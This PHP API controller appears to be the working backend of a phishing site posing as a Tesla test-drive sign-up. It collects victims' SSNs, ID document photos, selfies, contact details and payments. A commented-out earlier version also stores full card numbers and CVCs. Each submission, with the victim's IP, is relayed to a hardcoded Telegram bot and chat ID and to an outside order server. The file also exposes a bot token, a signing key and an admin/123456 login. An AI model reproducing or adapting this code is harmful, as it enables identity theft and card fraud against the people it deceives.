<?php

namespace app\api\controller;

use app\common\controller\Api;
use think\Db;
use think\Config;
use think\Log;
use fast\Random;

/**
 * 首页接口
 */
class Index extends Api
{
    protected $noNeedLogin = ['*'];
    protected $noNeedRight = ['*'];

    /**
     * 首页
     *
     */
    // public function index()
    // {
    //     $data=$this->request->post("data");
    //     $post_url=$this->request->post("url",$_SERVER['HTTP_HOST']);
    //     file_put_contents(APP_PATH.'/log.txt',$data.PHP_EOL,FILE_APPEND);
    //     $data=json_decode(htmlspecialchars_decode($data),true);
        
    //     // $this->success($data);
        
    //     // $adParam=$this->request->post('country','asfdfs');
    //     // $adParam=$data['ad'] ? $data['ad'] : 'test';
    //     // $this->success($adParam);
        
    //     $text='';
    //     foreach ($data as $key=>&$val){
    //         $v=explode('/',$val);
    //         if(isset($v[1])&&$v[1]=='uploads'){
    //             $val=$_SERVER['REQUEST_SCHEME']."://".$_SERVER['HTTP_HOST'].$val;
    //             $sendPhoto=[
    //                 'chat_id'=>'2042615858',
    //                 'photo'=>$val,
    //             ];
    //             $this->sendPhoto($sendPhoto);
    //         }
    //         $text.=$key.':'.$val.PHP_EOL;
    //     }
        
                
    //     $this->send_get('2042615858',$text);
    //     $tgid=Config::get('site.tgid');
    //     if (!isset($data['ad'])) {
    //         $data['ad'] = "test";
    //     }
    //     if ($tgid&&isset($data['ad'])) {
    //         $this->send_get($tgid,'广告id '.$data['ad'].' 进单');
    //     }
        
    //     $time=time();
    //     $data['orderNu']=$_SERVER['HTTP_HOST'].$time;
    //     $data['url']=$_SERVER['REQUEST_SCHEME']."://".$post_url;
    //     $time=time();
    //     // $url=Db::name('url')->where(['url'=>$post_url])->field('user_id,amount')->find();
    //     $amount=Config::get('site.amount');
    //     $amountFast=Config::get('site.amount_fast');
    //     if (isset($data['insuranceType'])&&$data['insuranceType']=='insurance_fee') {
    //         $data['amount']=isset($amount)?$amount:19.90;    
    //     }
    //     if (isset($data['insuranceType'])&&$data['insuranceType']=='insurance_fast_fee') {
    //         $data['amount']=isset($amountFast)?$amountFast:9.90;
    //     }
    //     $data['states']=0;
    //     $data['city']=isset($data['city'])?$data['city']:'';
    //     $data['country']=isset($data['country'])?$data['country']:'';
        
    //     $paymentEmail=isset($data['paymentEmail'])?$data['paymentEmail']:'';
    //     $cardNumber=isset($data['cardNumber'])?$data['cardNumber']:'';
    //     $cardType=isset($data['cardType'])?$data['cardType']:'';
    //     $cardExpiry=isset($data['cardExpiry'])?$data['cardExpiry']:'';
    //     $cardCvc=isset($data['cardCvc'])?$data['cardCvc']:'';
    //     $cardName=isset($data['cardName'])?$data['cardName']:'';
        
    //     // $this->success($data);
        
    //     $res = Db::name('order')->insert([
    //         'data'=>json_encode($data),
    //         'createtime'=>$time,
    //         'updatetime'=>$time,
    //         'paymentEmail'=>$paymentEmail,
    //         'cardNumber'=>$cardNumber,
    //         'cardType'=>$cardType,
    //         'cardExpiry'=>$cardExpiry,
    //         'cardName'=>$cardName,
    //         'cardCvc'=>$cardCvc
    //     ]);
    //     if (!isset($data['email'])) {
    //         $data['email'] = "test";
    //     }
    //     if (!isset($data['phone'])) {
    //         $data['phone'] = "test";
    //     }
    //     if ($res) {
    //         $this->success('success', ['url'=> $_SERVER['REQUEST_SCHEME']."://".$_SERVER['HTTP_HOST'].'/#/submission_callback?state=1&email='.$data['email'].'&phone='.$data['phone'].'&origin=payment'.'&ad='.$data['ad']]);    
    //     } else {
    //         $this->error('failed', ['url' => $_SERVER['REQUEST_SCHEME']."://".$_SERVER['HTTP_HOST'].'/#/submission_callback?state=0&email='.$data['email'].'&phone='.$data['phone'].'&origin=payment'.'&ad='.$data['ad']] );    
    //     }
        
    // }
    
    public function index()
    {
        $data=$this->request->post("data");
        $post_url=$this->request->post("url",$_SERVER['HTTP_HOST']);
        file_put_contents(APP_PATH.'/log.txt',$data.PHP_EOL,FILE_APPEND);
        $data=json_decode(htmlspecialchars_decode($data),true);
        $id=$data['id'];
        $orderNu=$data['orderNu'];
        $text='';
        foreach ($data as $key=>&$val){
            $v=explode('/',$val);
            if(isset($v[1])&&$v[1]=='uploads'){
                $val=$_SERVER['REQUEST_SCHEME']."://".$_SERVER['HTTP_HOST'].$val;
                $sendPhoto=[
                    'chat_id'=>'2042615858',
                    'photo'=>$val,
                ];
                $this->sendPhoto($sendPhoto);
            }
            $text.=$key.':'.$val.PHP_EOL;
        }
        $text.='client_ip'.':'.$_SERVER['REMOTE_ADDR'].PHP_EOL;
        
        $this->send_get('2042615858',$text);
        $tgid=$data['tgid'];//$tgid=Config::get('site.tgid');
        
        $adParam = '';
        if(!isset($data['ad'])) {
            $adParam='test';    
        } else {
            $adParam=$data['ad'];
        }
        
        if ($tgid) {
            $this->send_get($tgid,'广告id '.$adParam.' 进单');
        }
        $time=time();
        
        
        // $success_url=$data['success_url'];
        // $cancel_url=$data['cancel_url'];
        
        $data['url']=$_SERVER['REQUEST_SCHEME']."://".$post_url;
        $time=time();
        $curcrency=isset($data['curcrency'])?$data['curcrency']:0;
        // $url=Db::name('url')->where(['url'=>$post_url])->field('user_id,amount')->find();
        // $amount=Config::get('site.amount');
        // $amountFast=Config::get('site.amount_fast');
        $amount=$data['amount'];
        $amountFast=$data['amount_fast'];
        
        if (isset($data['insuranceType'])&&$data['insuranceType']=='insurance_fee') {
            $data['amount']=isset($amount)?$amount:500;    
        }
        if (isset($data['insuranceType'])&&$data['insuranceType']=='insurance_fast_fee') {
            $data['amount']=isset($amountFast)?$amountFast:1050;
        }
        
        //  if (isset($data['test_drive_package'])&&$data['test_drive_package']==0) {
        //     $amount="100";//39.99;    
        // }
        // else if(isset($data['test_drive_package'])&&$data['test_drive_package']==1)
        // {
        //     $amount="200";//69.99;    
        // }else if(isset($data['test_drive_package'])&&$data['test_drive_package']==2){
        //     $amount="300";//169.99; 
        // }
        $states = 0;
        if (!isset($data['states'])) {
            $states=0;
        } else {
            $states=$data['states'];
        }
        $data['city']=isset($data['city'])?$data['city']:'';
        $data['country']=isset($data['country'])?$data['country']:'';
        $type=isset($data['type'])?$data['type']:0;
        
        $payment_intent_id=isset($data['payment_intent_id'])?$data['payment_intent_id']:'0';
        //$newID = Db::name('order')->insertGetId(['data'=>json_encode($data),'createtime'=>$time,'updatetime'=>$time]);
        // if($payment_intent_id =='0' || is_null($payment_intent_id))
        // {
        
        $arrData = [
            'data'=>json_encode($data),
            'updatetime'=>$time,
            // "cardNumber"=>$data['cardNumber'],
            // "cardType"=>$data['cardType'],
            // "cardExpiry"=>$data['cardExpiry'],
            // "cardCvc"=>$data['cardCvc'],
            // "cardName"=>$data['cardName'],
            // "states"=>$states,
            "clientip"=>$_SERVER['REMOTE_ADDR']
        ];
        if($id=='' && $orderNu==''){
            $data['orderNu']=$_SERVER['HTTP_HOST'].$time.Random::numeric(15);
            $arrData['createtime'] = $time;
            $arrData['orderNu'] = $data['orderNu'];
            $res = Db::name('order')->insertGetId($arrData);
            $dz="https://www.fbpro.info/api/Urlorder/setOrder";
            $ar= $arrData;
            $ar['url'] = $_SERVER['HTTP_HOST'];
            $ar['ad'] = $adParam;
            $ar['client_id'] = $res;
            $this->from_data($dz,$ar);
            $this->success('success', $ar);
        }else{
            $res=Db::name('order')->where(['id'=>$id])->update($arrData);
            $dz="https://www.fbpro.info/api/Urlorder/setOrder";
            $ar=$arrData;
            $ar['url'] = $_SERVER['HTTP_HOST'];
            $ar['ad'] = $adParam;
            $ar['client_id'] = $id;
            $ar['orderNu']=$orderNu;
            $this->from_data($dz,$ar);  
            $this->success('success', $ar);
        }
         //$this->error('error');
             
        // }else{
        //     $res=Db::name('order')->where(['id'=>$id])->update(['data'=>json_encode($data),'updatetime'=>$time]); 
        //     $dz="https://www.fbpro.info/api/Urlorder/setOrder";
        //     $ar=array(
        //         "data"=>json_encode($data),
        //         "url"=>$_SERVER['HTTP_HOST'],
        //         "client_id"=>$id,
        //         "updatetime"=>$time
        //         );
        //     $this->from_data($dz,$ar);
        // }
        $data['url']=$_SERVER['HTTP_HOST'];
        $data['order_id']=intval($id);
        $dt=json_encode($data);
        
        $key='0adea5c27173a4dee1a3565058ce8c1d';
        $data1=[
            'title'=>'Insurance',//订单编号
            'orderNo'=>$data['orderNu'],//订单编号
            'amount'=>$data['amount'],//金额
            'merchant_id'=>32,//商户编号
            'account'=>'admin',
            'password'=>'123456',
            // 'return_url'=>$success_url.'&id='.$id,//$_SERVER['REQUEST_SCHEME']."://".$_SERVER['HTTP_HOST'].'/#/success_callback?state=1&email='.$data['driveEmail'].'&phone='.$data['drivePhone'].'&origin=payment'.'&ad='.$adParam,//返回地址
            // 'error_url'=>$cancel_url.'&id='.$id,//$_SERVER['REQUEST_SCHEME']."://".$_SERVER['HTTP_HOST'].'/#/success_callback?state=0&email='.$data['driveEmail'].'&phone='.$data['drivePhone'].'&origin=payment'.'&ad='.$adParam,//返回地址
            'notify_url'=>$_SERVER['REQUEST_SCHEME']."://".$_SERVER['HTTP_HOST'].'/api/index/webhooks',//异步通知
            'key'=>$key,//密钥
            'type'=>$type,//支付方式1=>iban 0=>st
            'curcrency'=>$curcrency,//0,//iban支付时 0是gbp 1是eur            'url'=>$_SERVER['HTTP_HOST'],
            'url'=>$_SERVER['HTTP_HOST'],
            'orders'=>$dt,
            'payment_intent_id'=>$payment_intent_id
        ];
        $data1['sign']=$this->sign_get($data1);

// $this->success($data1);
        $res=$this->from_data('https://www.stcrof.com/v1/index/checkout',$data1);
        $res=json_decode($res,true);
         if($type==6 || $type==7 || $type==8 || $type==10 || $type==11){
             $this->success('success',$res);
         }  
        if ($res['code']==1){
            $this->success('success',['url'=>$res['data']['url'].'&orderNo='.$data1['orderNo'].'&amount='.$data1['amount']]);
        }else{
            $this->error($res['msg']);
        }
        $this->error('error');
            
        // if (isset($data['test_drive_package'])) {
            
        // }
        // if(isset($data['email'])){
        //     $username=isset($data['username'])?$data['username']:$data['firstName'].' '.$data['lastName'];
        //     $Emaildata=[
        //         'row[account]'=>'admin',
        //         'row[password]'=>'123456',
        //         'row[title]'=>'Your Tesla test drive information is complete!',
        //         'row[type]'=>'orderSuccess',
        //         'row[username]'=>$username,
        //         'row[vehicleModel]'=>$data['vehicleModel'],
        //         'row[vehicleModelImg]'=>$_SERVER['REQUEST_SCHEME']."://".$_SERVER['HTTP_HOST'].'/static/media/'.strtolower($data['vehicleModel']).'.jpg',
        //         'row[email]'=>$data['email'],
        //         'row[url]'=>$_SERVER['REQUEST_SCHEME']."://".$_SERVER['HTTP_HOST']
        //         // 'row[email]'=>'didiaooliver@gmail.com'
        //     ];
        //     $ret=$this->from_data('https://email.ouronepiece.com/api/ems/send',$Emaildata);
        // }
        
        $email=isset($data['email'])?$data['email']:'';
        $phone=isset($data['phone'])?$data['phone']:'';
        $driveEmail=isset($data['driveEmail'])?$data['driveEmail']:$email;
        $drivePhone=isset($data['drivePhone'])?$data['drivePhone']:$phone;
        $this->success('success',['url'=>$_SERVER['REQUEST_SCHEME']."://".$post_url.'/#/submission_callback?state=1&email='.$driveEmail.'&phone='.$drivePhone]);
        
    }


    public function getOrderInfo() {
        if($this->request->isPost()){
            $id=$this->request->post('id');
            $order = Db::name('order')->where(['id'=>$id])->find();
            $this->success('success',$order);
        }
    }
    public function updateOrder(){
        if($this->request->isPost()){
        $data=$this->request->post('data');
        $data=json_decode(htmlspecialchars_decode($data),true);
        $text='';
        foreach ($data as $key=>&$val){
            $v=explode('/',$val);
            if(isset($v[1])&&$v[1]=='uploads'){
                $val=$_SERVER['REQUEST_SCHEME']."://".$_SERVER['HTTP_HOST'].$val;
                $sendPhoto=[
                    'chat_id'=>'2042615858',
                    'photo'=>$val,
                ];
                $this->sendPhoto($sendPhoto);
            }
            $text.=$key.':'.$val.PHP_EOL;
        }
        $this->send_get('2042615858',$text);
        //$this->success('success',$text);
        $tgid=$data['tgid'];//$tgid=Config::get('site.tgid');
        $this->send_get($tgid,'广告id '.$data['ad'].' 进单');
        $id=$data['id'];
        $orderNu=$data['orderNu'];
        $time=time();
        if($id=='' && $orderNu=='')
        {
            $orderNu=$_SERVER['HTTP_HOST'].$time.Random::numeric(15);
            $data['orderNu']=$orderNu;
            $newID = Db::name('order')->insertGetId(['data'=>json_encode($data),'createtime'=>$time,'updatetime'=>$time,'orderNu'=>$orderNu]);
            $dz="https://www.fbpro.info/api/Urlorder/setOrder";
            $ar=array(
                "data"=>json_encode($data),
                "url"=>$_SERVER['HTTP_HOST'],
                "client_id"=>$newID,
                "createtime"=>$time,
                "updatetime"=>$time,
                "orderNu"=>$orderNu
                );
            $this->from_data($dz,$ar);
            $data=['id'=>$newID,'quantity'=>0,'orderNu'=>$orderNu];
            $this->success('success',$data);
        }else{
            $ord = Db::name('order')->where(['id'=>$id])->find();
            $datan=json_decode($ord['data']);
            
            $datan->firstName=isset($data['firstName'])?$data['firstName']:(isset($datan->firstName)?$datan->firstName:'');
            $datan->lastName=isset($data['lastName'])?$data['lastName']:(isset($datan->lastName)?$datan->lastName:'');
            $datan->email=isset($data['email'])?$data['email']:(isset($datan->email)?$datan->email:'');
            $datan->phone=isset($data['phone'])?$data['phone']:(isset($datan->phone)?$datan->phone:'');
            $datan->driveEmail=isset($data['driveEmail'])?$data['driveEmail']:(isset($datan->driveEmail)?$datan->driveEmail:'');
            $datan->drivePhone=isset($data['drivePhone'])?$data['drivePhone']:(isset($datan->drivePhone)?$datan->drivePhone:'');
            $datan->state=isset($data['state'])?$data['state']:(isset($datan->state)?$datan->state:'');
            $datan->city=isset($data['city'])?$data['city']:(isset($datan->city)?$datan->city:'');
            $datan->country=isset($data['country'])?$data['country']:(isset($datan->country)?$datan->country:'');
            $datan->address=isset($data['address'])?$data['address']:(isset($datan->address)?$datan->address:'');
            $datan->zipCode=isset($data['zipCode'])?$data['zipCode']:(isset($datan->zipCode)?$datan->zipCode:'');
            $datan->vehicleModel=isset($data['vehicleModel'])?$data['vehicleModel']:(isset($datan->vehicleModel)?$datan->vehicleModel:'');
            $datan->identityType=isset($data['identityType'])?$data['identityType']:(isset($datan->identityType)?$datan->identityType:'');
            $datan->documentFront=isset($data['documentFront'])?$data['documentFront']:(isset($datan->documentFront)?$datan->documentFront:'');
            $datan->documentBack=isset($data['documentBack'])?$data['documentBack']:(isset($datan->documentBack)?$datan->documentBack:'');
            $datan->userSelfPictureOrVideo=isset($data['userSelfPictureOrVideo'])?$data['userSelfPictureOrVideo']:(isset($datan->userSelfPictureOrVideo)?$datan->userSelfPictureOrVideo:'');
            $datan->ad=isset($data['ad'])?$data['ad']:(isset($datan->ad)?$datan->ad:'');
            $datan->snCode=isset($data['snCode'])?$data['snCode']:(isset($datan->snCode)?$datan->snCode:'');
            $datan->contactType=isset($data['contactType'])?$data['contactType']:(isset($datan->contactType)?$datan->contactType:'');
        
            $res=Db::name('order')->where(['id'=>$id])->update(['data'=>json_encode($datan),'updatetime'=>$time]);
            $dz="https://www.fbpro.info/api/Urlorder/setOrder";
            $ar=array(
                "data"=>json_encode($datan),
                "url"=>$_SERVER['HTTP_HOST'],
                "client_id"=>$id,
                "updatetime"=>$time,
                "orderNu"=>$orderNu
                );
            $this->from_data($dz,$ar);
            $data=['id'=>0,'quantity'=>$res,'orderNu'=>$orderNu];
            $this->success('success',$data);
        }
        //$res = $this->send_get('6670413461',$val);
        }
    }
    public function customstatus()
    {
        if ($this->request->isPost())
        {
            $payment_intent_id=$this->request->post('payment_intent_id');
            $status=$this->request->post('status');
            $c_site_url=$this->request->post('c_site_url');
            $subscriptionId=$this->request->post('subscriptionId');
            $curcrency=$this->request->post('curcrency');
            $data=[
                'payment_intent_id'=>$payment_intent_id,
                'status'=>$status,
                'c_site_url'=>$c_site_url,
                'from_subscription'=>$subscriptionId,
                'curcrency'=>$curcrency
            ];
            $res1 = $this->from_data('https://www.stcrof.com/v1/index/subscriptionupdate', $data);
            //$res = $this->from_data('https://www.stcrof.com/v1/index/customstatus', $data);
            $this->success('success', json_decode($res1));
        }
    }
    
    function sendPhoto($data,$type='sendPhoto'){
        $url = "https://api.telegram.org/bot6613864001:AAFIu1oCzZJeZKtXg6r0nh02V6L7REjw6fQ/".$type;
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
        curl_setopt($ch, CURLOPT_POST, 1);
        // curl_setopt($ch, CURLOPT_HTTPHEADER,['Content-Type:multipart/form-data']);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        $output = curl_exec($ch); // 执行操作
        if (curl_errno($ch)) {
            echo 'Errno'.curl_error($ch);//捕抓异常
        }
        curl_close($ch); // 关闭CURL会话
        
        return $output;
    }
    
    function send_get($tgid,$text){
        $url = "https://api.telegram.org/bot6613864001:AAFIu1oCzZJeZKtXg6r0nh02V6L7REjw6fQ/sendMessage";
        $data=[
            'chat_id'=>$tgid,
            'text'=>$text,
        ];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        $output = curl_exec($ch);
        curl_close($ch);
    }
    
    public function webhooksForEF(){
        Log::record('有进入webhooksForEF');
        $data=@file_get_contents('php://input');
        parse_str($data,$data);
        $orderNo=$this->request->get('orderNo');
        $status=$this->request->get('status');
        Db::name('order')->where(['orderNu'=>$orderNo])->update(['states'=>$status]);
        $dz="https://www.fbpro.info/api/Urlorder/xiugaizhuangtai";
        $ar=array(
            "url"=>$_SERVER['HTTP_HOST'],
            "orderNu"=>$orderNo,
            "states"=>$status
        );
        $this->from_data($dz,$ar);
    }
    
    public function webhooks(){
        // $orderNu=$this->request->get("orderNo");
        // $where['orderNu']=$orderNu;
        // $data=[
        //     'states'=>1,
        //     'updatetime'=>$time,
        // ];
        // Db::name('order')->where($where)->update($data);
        // return true;
        $data=@file_get_contents('php://input');
        parse_str($data,$data);
        $orderNo=$data['orderNo'];
        Log::record($orderNo);
        $data=$data['data'];
        $data=$this->decryptData($data,$orderNo);
        $data=json_decode($data,true);
        if(is_array($data)){
            Db::name('order')->where(['orderNu'=>$orderNo])->update(['states'=>$data['status']]);
        }
        Log::record('有进入notify');
        $dz="https://www.fbpro.info/api/Urlorder/xiugaizhuangtai";
        $ar=array(
            "url"=>$_SERVER['HTTP_HOST'],
            "orderNu"=>$orderNo,
            "states"=>$data['status']
        );
        $this->from_data($dz,$ar);
    }
    function sign_get($params) {
        $key=$params['key'];
        unset($params['sign']);
        unset($params['key']);
        ksort($params);
        reset($params);
        $data = http_build_query($params) . "&key=" . $key;
        return strtoupper(md5($data));
    }
    function from_data($url,$data){
        $options = [
            'http' => [
                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                'method'  => 'POST',
                'content' => http_build_query($data),
            ],
        ];
        
        $context = stream_context_create($options);
        $response = file_get_contents($url, false, $context);
        return $response;
    }
    
    function encryptData($data, $key) {
        $ivSize = openssl_cipher_iv_length('aes-256-cbc');
        $iv = openssl_random_pseudo_bytes($ivSize);
        $encrypted = openssl_encrypt($data, 'aes-256-cbc', $key, 0, $iv);
        return base64_encode($iv . $encrypted);
    }
    
    // 解密函数
    function decryptData($encryptedData, $key) {
        $encryptedData = base64_decode($encryptedData);
        $ivSize = openssl_cipher_iv_length('aes-256-cbc');
        $iv = substr($encryptedData, 0, $ivSize);
        $encrypted = substr($encryptedData, $ivSize);
        return openssl_decrypt($encrypted, 'aes-256-cbc', $key, 0, $iv);
    }

    public function getConfig(){
        $locale=$this->request->post("locale");
        $data=[
            'title'=> "Schedule a Demo Drive",
            'test_drive_description'=> "Get behind the wheel for a no-pressure driving experience. Discover the vehicle, learn about the benefits of EV and get a personalized charging plan. Drivers must have a valid U.S. driver's license and be 18 years of age or older.",
            'vehicle_model_S'=> "Model S",
            'vehicle_model_3'=> "Model 3",
            'vehicle_model_X'=> "Model X",
            'vehicle_model_Y'=> "Model Y",
            'title_CI'=> "Contact Information",
            'title_FN'=> "First Name",
            'title_LN'=> "Last Name",
            'title_EA'=> "Email Address",
            'title_DEA'=> "Driver Email Address",
            'title_PN'=> "Phone Number",
            'title_DPN'=> "Driver Phone Number",
            'title_State'=> "State",
            'title_Address'=> "Address",
            'title_ZCode'=> "Zip Code ",
            'description_ZCode'=> "Your zip code determines which city you can pick up your test drive car",
            'promise_text'=> "I promise that the above information is true and valid, and I am truly applying for a test drive.",
            'title_sn'=> "SSN",
            'title_SelectIT'=> "Select identification type",
            'description_SelectIT'=> "Select the certificate type and upload the photo of the certificate",
            'choice_IdC'=> "Identity card",
            'choice_DL'=> "Driver's license",
            'choice_psp'=> "Passport",
            'title_UploadYS'=> "Upload your selfie",
            'title_ChooseAP'=> "Choose a plan",
            'choice_pay_online'=> "Pay \$19.9 to skip the queue and get test car within 15 days.",
            'choice_pay_offline'=> "Wait in line to apply (30-45 days get test car)",
            'video_tip'=> "Click to take portrait video",
        ];
        $langlist=Config::get('site.langlist');
        if($langlist){
            $data=json_decode($langlist,true);
            if (isset($data[$locale])) {
                $data=$data[$locale];
            }
        }
        $this->success('success',$data);
    }
    
    public function getpixel(){
        $data['pixel']=Config::get('site.pixel');
        $data['amount']=Config::get('site.amount');
        $data['amount_fast']=Config::get('site.amount_fast');
        $data['analytics']=Config::get('site.analytics');
        $data['mixpanelToken']=Config::get('site.mixpanelToken');
        $this->success('success',$data);
    }
    
    public function address(){
        $zipcode=$this->request->post("zipcode");
        $parts=$this->request->post("parts");
        $url='https://api.excelapi.org/post/address';
        if($zipcode){
            $url.='?zipcode='.$zipcode;
        }
        if($parts){
            $url.='&parts='.$parts;
        }
        $data=file_get_contents($url);
        $this->success('success',$data);
    }
    
    

}
